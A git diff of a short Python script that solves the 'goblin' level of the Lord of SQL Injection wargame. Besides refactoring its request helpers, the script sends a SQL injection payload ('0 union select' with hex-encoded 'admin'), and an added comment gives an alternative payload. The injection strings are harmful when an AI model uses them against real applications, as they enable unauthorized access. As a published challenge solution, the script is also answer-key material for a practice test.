@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
+from connect import my_request as req
 
 
 def main():
@@ -16,11 +18,12 @@ def main():
     '''
 
     url = "https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
 
+    # (no='0 or id=0x61646D696E')
     param = dict(no='0 union select 0x61646D696E')
 
-    response = los.get_request(url, param, cook)
+    response = req.get_request(url, param, cook)
 
     if 'Clear!' in response:
         print('GOBLIN Clear!')
